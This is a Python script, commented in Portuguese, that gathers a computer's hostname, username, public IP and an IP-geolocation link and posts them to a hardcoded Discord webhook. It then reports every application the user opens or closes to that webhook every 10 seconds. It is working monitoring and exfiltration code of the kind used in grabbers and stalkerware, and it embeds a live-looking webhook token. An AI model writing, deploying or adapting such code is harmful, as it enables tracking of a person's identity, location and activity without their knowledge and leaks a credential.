import requests
import socket
import getpass
from datetime import datetime
import psutil
import time

# ======================
# CONFIGURAÇÕES
# ======================

WEBHOOK_URL = "https://discord.com/api/webhooks/1479092676736454699/gmMwhXQRJ_v1VY-MecwZDf97v0zzo_w27OkOdGuaKGkgLPOMYTFFL11Qx0MAtQ0GM1U5"

# Lista de processos inúteis
INUTEIS = {
    "System Idle Process", "System", "Registry", "csrss.exe", "wininit.exe",
    "services.exe", "lsass.exe", "svchost.exe", "smss.exe", "rundll32.exe",
    "SearchIndexer.exe", "sihost.exe", "taskhostw.exe", "ctfmon.exe",
    "pet.exe", "vgtray.exe", "MpDefenderCoreService.exe", "atieclxx.exe",
    "MsMpEng.exe", "MemCompression", "conhost.exe", "winlogon.exe",
    "fontdrvhost.exe", "dwm.exe", "dllhost.exe", "SearchProtocolHost.exe",
    "smartscreen.exe", "SecurityHealthService.exe", "SearchFilterHost.exe",
    "CompPkgSrv.exe", "steamwebhelper.exe", "UserOOBEBroker.exe",
    "audiodg.exe", "DeviceDriver.exe", "WebManagement.exe", "AMDRSSrcExt.exe",
    "AMDRSServ.exe", "atiesrxx.exe", "StartMenuExperienceHost.exe", "WmiPrvSE.exe",
    "TextInputHost.exe", "SystemSettings.exe", "ShellExperienceHost.exe",
    "SgrmBroker.exe", "SecurityHealthSystray.exe", "RuntimeBroker.exe",
    "NisSrv.exe", "steamservice.exe", "crashpad_handler.exe"
}

# ======================
# FUNÇÕES
# ======================

def enviar_discord(mensagem):
    """Envia uma mensagem para o Discord via webhook"""
    data = {"content": mensagem}
    try:
        requests.post(WEBHOOK_URL, json=data)
    except Exception as e:
        print(f"Erro ao enviar webhook: {e}")

def pegar_aplicativos():
    """Retorna os nomes dos aplicativos ativos, excluindo processos inúteis"""
    apps = set()
    for proc in psutil.process_iter(['name']):
        try:
            nome = proc.info['name']
            if nome and nome not in INUTEIS:
                apps.add(nome)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return apps

def enviar_info_inicial():
    """Envia informações do PC, usuário e IP"""
    try:
        ip = requests.get("https://api.ipify.org").text
    except:
        ip = "Não foi possível obter"
    
    pc = socket.gethostname()
    user = getpass.getuser()
    
    agora = datetime.now()
    data = agora.strftime("%d/%m/%Y")
    hora = agora.strftime("%H:%M")
    
    link = f"https://ipinfo.io/{ip}" if ip != "Não foi possível obter" else "N/A"
    
    mensagem = f"""💻 Informações do sistema:
PC: {pc}
Usuário: {user}
IP Público: {ip}
Localização: {link}
Data/Hora: {data} {hora}"""
    
    enviar_discord(mensagem)
    print(mensagem)

# ======================
# SCRIPT PRINCIPAL
# ======================

if __name__ == "__main__":
    enviar_info_inicial()
    
    apps_anteriores = set()
    print("\nMonitorando aplicativos abertos. Atualizando a cada 10 segundos...\n")
    
    while True:
        apps_atuais = pegar_aplicativos()
        
        novos = apps_atuais - apps_anteriores
        fechados = apps_anteriores - apps_atuais
        
        if novos or fechados:
            mensagem = ""
            if novos:
                mensagem += "🟢 Novos aplicativos abertos:\n" + "\n".join(sorted(novos)) + "\n"
            if fechados:
                mensagem += "🔴 Aplicativos fechados:\n" + "\n".join(sorted(fechados))
            
            mensagem = mensagem.strip()
            print(mensagem)
            enviar_discord(mensagem)
        
        apps_anteriores = apps_atuais
        time.sleep(10)
